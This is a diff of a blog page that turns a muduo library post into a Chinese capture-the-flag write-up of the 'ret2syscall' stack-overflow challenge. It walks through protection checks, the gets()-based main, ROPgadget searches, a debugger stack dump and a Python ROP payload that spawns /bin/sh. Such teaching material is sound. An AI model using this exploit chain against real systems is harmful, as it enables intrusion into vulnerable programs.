@@ -96,19 +96,22 @@
 
 
 
-<meta name="description" content="博客网址：www.shicoder.top微信：18223081347欢迎加群聊天 ：452380935  今天不先实现muduo项目，我们先来看下muduo库的基本使用，只有了解了如何用，才能在写代码的时候知道自己写的找个函数是干嘛的，实际上是怎么使用的这个函数。首先说简单点，就是定义一个Server，设置两个回调函数">
+<meta name="description" content="博客网址：www.shicoder.top微信：18223081347欢迎加群聊天 ：452380935  这一次我们来深入分析下更难的栈溢出题目ret2syscall">
 <meta property="og:type" content="article">
-<meta property="og:title" content="muduo源码分析之muduo简单运用">
-<meta property="og:url" content="http://www.shicoder.top/posts/713527548.html">
+<meta property="og:title" content="ret2syscall">
+<meta property="og:url" content="http://www.shicoder.top/posts/850767793.html">
 <meta property="og:site_name" content="一个爱代码的Coder">
-<meta property="og:description" content="博客网址：www.shicoder.top微信：18223081347欢迎加群聊天 ：452380935  今天不先实现muduo项目，我们先来看下muduo库的基本使用，只有了解了如何用，才能在写代码的时候知道自己写的找个函数是干嘛的，实际上是怎么使用的这个函数。首先说简单点，就是定义一个Server，设置两个回调函数">
+<meta property="og:description" content="博客网址：www.shicoder.top微信：18223081347欢迎加群聊天 ：452380935  这一次我们来深入分析下更难的栈溢出题目ret2syscall">
 <meta property="og:locale">
-<meta property="article:published_time" content="2022-02-20T07:39:55.000Z">
-<meta property="article:modified_time" content="2022-05-07T12:43:01.903Z">
+<meta property="og:image" content="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220513104822074.png">
+<meta property="og:image" content="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220513111322877.png">
+<meta property="article:published_time" content="2022-05-13T02:33:05.000Z">
+<meta property="article:modified_time" content="2022-05-13T03:13:28.162Z">
 <meta property="article:author" content="shilinkun">
 <meta property="article:tag" content="导航">
 <meta property="article:tag" content="分享">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220513104822074.png">
 
 
 
@@ -138,13 +141,13 @@
 
 
 
-  <link rel="canonical" href="http://www.shicoder.top/posts/713527548.html"/>
+  <link rel="canonical" href="http://www.shicoder.top/posts/850767793.html"/>
 
 
 
 
 
-  <title>muduo源码分析之muduo简单运用 | 一个爱代码的Coder</title>
+  <title>ret2syscall | 一个爱代码的Coder</title>
   
 
 
@@ -324,7 +327,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.shicoder.top/posts/713527548.html">
+    <link itemprop="mainEntityOfPage" href="http://www.shicoder.top/posts/850767793.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -341,7 +344,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">muduo源码分析之muduo简单运用</h1>
+          <h1 class="post-title" itemprop="name headline">ret2syscall</h1>
         
 
         <div class="post-meta">
@@ -354,8 +357,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-20T15:39:55+08:00">
-                2022-02-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-05-13T10:33:05+08:00">
+                2022-05-13
               </time>
             
 
@@ -377,8 +380,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/" itemprop="url" rel="index">
-                    <span itemprop="name">后端开发</span>
+                  <a href="/categories/PWN/" itemprop="url" rel="index">
+                    <span itemprop="name">PWN</span>
                   </a>
                 </span>
 
@@ -395,8 +398,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/posts/713527548.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/posts/713527548.html" itemprop="commentCount"></span>
+                <a href="/posts/850767793.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/posts/850767793.html" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -423,7 +426,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  308
+                  1.4k
                 </span>
               
 
@@ -439,7 +442,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1
+                  7
                 </span>
               
             </div>
@@ -463,13 +466,52 @@
         <blockquote>
 <p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p>
 </blockquote>
-<p>今天不先实现<code>muduo</code>项目，我们先来看下<code>muduo</code>库的基本使用，只有了解了如何用，才能在写代码的时候知道自己写的找个函数是干嘛的，实际上是怎么使用的这个函数。首先说简单点，就是定义一个<code>Server</code>，设置两个回调函数</p>
+<p>这一次我们来深入分析下更难的栈溢出题目<code>ret2syscall</code></p>
 <span id="more"></span>
 
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 回调连接相关的事件</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onConnection</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn)</span></span>;</span><br><span class="line"><span class="comment">// 回调读写事件</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onMessage</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn, Buffer *buffer, Timestamp time)</span></span>;</span><br></pre></td></tr></table></figure>
-<p>意思就是当有客户连接或者断开连接的时候，需要<code>Server</code>做什么，当连接上有读写事件发生时候，需要<code>Server</code>做什么。<br>比如一个<code>EchoServer</code>，当建立连接的时候，会自动调用<code>onConnection</code>函数，当比如我们发送一个消息时候，会自动调用<code>onMessage</code>函数。还有2个重要函数<code>loop</code>，<code>start</code></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server.<span class="built_in">start</span>();</span><br><span class="line">loop.<span class="built_in">loop</span>();</span><br></pre></td></tr></table></figure>
-<p>这里简答讲下这2个的区别，其实如果和<code>Epoll</code>做对比的话，<code>start</code>就相当于<code>epoll_create</code>，<code>loop</code>就相当于<code>epoll_wait</code>，后面再根据代码具体说明2个的区别。</br><br>以上就是基本的<code>muduo</code>使用，下一章就开始具体的<code>muduo</code>代码实现。</p>
+<p>首先还是先检查下的保护</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/pwn/桌面/题目/ROP/ret2syscall&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到开启了栈不可以执行保护，不能在栈上覆盖我们的shellcode，那去看下是不是和<code>ret2shellcode</code>有一个bss段可以执行呢？，我们去看下<code>IDA</code>反编译的结果</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>感觉没有可以使用的bss段呢，但我们打开<code>IDA</code>发现，它的函数窗口怎么这么多函数呀，但<code>main</code>函数完全没有使用很多呢，那它是不是静态链接的呀，于是使用file查看下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ROP$ </span><span class="language-bash">file ret2syscall</span> </span><br><span class="line">ret2syscall: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>看来是静态链接，那好办了，就是我们熟悉的<code>ROP</code>思想了，下面我简单说下这个思想是什么意思</p>
+<p>首先我们知道最终是要程序执行<code>execve(&quot;/bin/sh&quot;)</code>这段代码，就可以得到<code>shell</code>，那这个函数其实就是一个系统调用，对应的反汇编代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 0xb</span><br><span class="line">mov ebx, [“/bin/sh”] </span><br><span class="line">mov ecx, 0</span><br><span class="line">mov edx, 0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>因此下面这个图展示栈溢出的原理</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220513104822074.png" alt="image-20220513104822074"></p>
+<p>那是不是我们溢出的栈中，只要包含这几句代码，然后让他挨着执行，那是不是类似我们执行了<code>execve(&quot;/bin/sh&quot;)</code>呢，而且注意到这个程序是静态链接，那肯定有很多库被引进来了，所以找到这些代码片段应该不是很难，那怎么找呢，有一个指令<code>ROPgadget</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ROP$ </span><span class="language-bash">ROPgadget --binary ret2syscall  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span></span></span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
+
+<p>比如我们想找到<code>pop eax;ret</code>这行代码，上面看到有这么多，那选<code>0x080bb196</code>。</p>
+<p>同样我们需要找到<code>pop ebx;ret</code>，</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ROP$ </span><span class="language-bash">ROPgadget --binary ret2syscall  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;ebx&#x27;</span></span></span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>看到有一行<code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code>，这刚好完全，那就这一条把</p>
+<p>那还有一个，我们需要<code>/bin/sh</code>这个字符串呢，同样</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2syscall  --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>最后就是int0x80的地址，同样</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2syscall  --only &#x27;int&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure>
+
+<p>当然这道题就是完全巧合，正常题目不可能这样，这里就是熟悉下，hhh</p>
+<p>现在把执行<code>execve(&quot;/bin/sh&quot;)</code>的汇编代码完全找到了，那其实就是将这些代码挨着进行栈覆盖，让<code>eip</code>不断的在这几行汇编跳转执行，最终实现<code>execve(&quot;/bin/sh&quot;)</code>。</p>
+<p>那<code>exp</code>怎么写呢，先直接看下<code>payload</code>把</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop_eax_ret= <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret= <span class="number">0x0806eb90</span></span><br><span class="line">bin_sh_adr=<span class="number">0x080be408</span></span><br><span class="line">int0x80_adr=<span class="number">0x08049421</span></span><br><span class="line"> </span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh_adr)+p32(int0x80_adr)</span><br></pre></td></tr></table></figure>
+
+<p>首先还是用<code>IDA</code>看下需要覆盖多少字节</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt; </span><span class="language-bash">stack 40</span></span><br><span class="line">00:0000│ esp  0xffffd100 —▸ 0xffffd11c ◂— &#x27;AAAAAAAA&#x27;</span><br><span class="line">01:0004│      0xffffd104 ◂— 0x0</span><br><span class="line">02:0008│      0xffffd108 ◂— 0x1</span><br><span class="line">03:000c│      0xffffd10c ◂— 0x0</span><br><span class="line">04:0010│      0xffffd110 ◂— 0x1</span><br><span class="line">05:0014│      0xffffd114 —▸ 0xffffd214 —▸ 0xffffd3c7 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">06:0018│      0xffffd118 —▸ 0xffffd21c —▸ 0xffffd3ef ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class="line">07:001c│ eax  0xffffd11c ◂— &#x27;AAAAAAAA&#x27;</span><br><span class="line">... ↓</span><br><span class="line">09:0024│      0xffffd124 —▸ 0xffffd200 —▸ 0x8049630 (__libc_csu_fini) ◂— push   ebx</span><br><span class="line">0a:0028│      0xffffd128 ◂— 0x8000</span><br><span class="line">0b:002c│      0xffffd12c —▸ 0x8048b36 (init_cacheinfo+86) ◂— test   eax, eax</span><br><span class="line">0c:0030│      0xffffd130 ◂— 0x28 /* &#x27;(&#x27; */</span><br><span class="line">0d:0034│      0xffffd134 ◂— 0x1</span><br><span class="line">0e:0038│      0xffffd138 ◂— 0x16</span><br><span class="line">0f:003c│      0xffffd13c ◂— 0x8000</span><br><span class="line">10:0040│      0xffffd140 —▸ 0x80da404 (__EH_FRAME_BEGIN__) ◂— adc    al, 0</span><br><span class="line">11:0044│      0xffffd144 —▸ 0x80eaf84 (object) ◂— 0xffffffff</span><br><span class="line">12:0048│      0xffffd148 —▸ 0xffffd21c —▸ 0xffffd3ef ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class="line">13:004c│      0xffffd14c ◂— 0x1</span><br><span class="line">14:0050│      0xffffd150 —▸ 0xffffd214 —▸ 0xffffd3c7 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">15:0054│      0xffffd154 —▸ 0xffffd21c —▸ 0xffffd3ef ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class="line">16:0058│      0xffffd158 ◂— 0x1</span><br><span class="line">17:005c│      0xffffd15c —▸ 0x8049612 (__libc_csu_init+130) ◂— add    ebp, 1</span><br><span class="line">18:0060│      0xffffd160 ◂— 0x1</span><br><span class="line">19:0064│      0xffffd164 —▸ 0xffffd214 —▸ 0xffffd3c7 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">1a:0068│      0xffffd168 —▸ 0xffffd21c —▸ 0xffffd3ef ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class="line">1b:006c│      0xffffd16c ◂— 0x2</span><br><span class="line">1c:0070│      0xffffd170 —▸ 0x80ea078 (__exit_funcs) —▸ 0x80eb2a0 (initial) ◂— 0x0</span><br><span class="line">1d:0074│      0xffffd174 —▸ 0xffffd214 —▸ 0xffffd3c7 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">1e:0078│      0xffffd178 —▸ 0xffffd21c —▸ 0xffffd3ef ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class="line">1f:007c│      0xffffd17c —▸ 0x80481a8 (_init) ◂— push   ebx</span><br><span class="line">20:0080│      0xffffd180 ◂— 0x0</span><br><span class="line">21:0084│      0xffffd184 —▸ 0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8067b10 (__stpcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]</span><br><span class="line">22:0088│ ebp  0xffffd188 —▸ 0x8049630 (__libc_csu_fini) ◂— push   ebx</span><br><span class="line">23:008c│      0xffffd18c —▸ 0x804907a (__libc_start_main+458) ◂— mov    dword ptr [esp], eax</span><br><span class="line">24:0090│      0xffffd190 ◂— 0x1</span><br><span class="line">25:0094│      0xffffd194 —▸ 0xffffd214 —▸ 0xffffd3c7 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">26:0098│      0xffffd198 —▸ 0xffffd21c —▸ 0xffffd3ef ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>首先需要覆盖<code>0xffffd18c-0xffffd11c=112</code>个字节，然后就开始覆盖返回地址，我们要按照这个过程进行覆盖</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB